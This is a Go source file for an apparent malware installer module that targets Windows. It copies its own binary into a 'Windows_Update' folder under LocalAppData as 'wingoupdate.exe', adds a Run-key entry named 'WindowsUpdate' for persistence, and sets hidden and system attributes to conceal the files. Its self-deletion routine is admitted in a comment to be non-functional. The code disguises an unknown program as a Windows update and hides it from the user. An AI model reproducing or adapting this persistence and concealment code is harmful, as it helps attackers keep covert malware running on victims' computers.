// +build windows !linux !darwin

package installer

import (
	"os"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

const targetFile string = "wingoupdate.exe"
const fileprems os.FileMode = 0700

var hide bool = true //change to false to prevent attrib of file and folder

//Install funcation installs the go binary into the host
func Install() (err error) {
	appdir := os.Getenv("LocalAppData")
	targetdir := appdir + "\\Windows_Update"
	//Check for the directory's existence and create it if it doesn't exist
	if _, err := os.Stat(targetdir); os.IsNotExist(err) {
		os.Mkdir(targetdir, fileprems)
	}
	err = os.Rename(os.Args[0], targetdir+"\\"+targetFile)
	if err != nil {
		return err
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err = k.SetStringValue("WindowsUpdate", appdir+"\\Windows_Update\\"+targetFile); err != nil {
		return err
	}
	if err = k.Close(); err != nil {
		return err
	}
	if hide == true {
		tDirFile := []string{targetdir, targetdir + "\\" + targetFile}
		if err = Stealthify(tDirFile); err != nil {
			return err
		}
	}
	return nil
}

//Stealthify use Windows native funcation to hide the file on disk
func Stealthify(tDirFile []string) (err error) {
	for _, file := range tDirFile {
		nameptr, err := syscall.UTF16PtrFromString(file)
		if err != nil {
			return err
		}
		err = syscall.SetFileAttributes(nameptr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
		if err != nil {
			return err
		}
	}
	return nil
}

//SetPurge delete file from disk on exit
func SetPurge(file string) error {

	//TBD this will not work, file is in use.  Need to create process/service/etc to remove...
	defer os.Remove(file)
	return nil
}
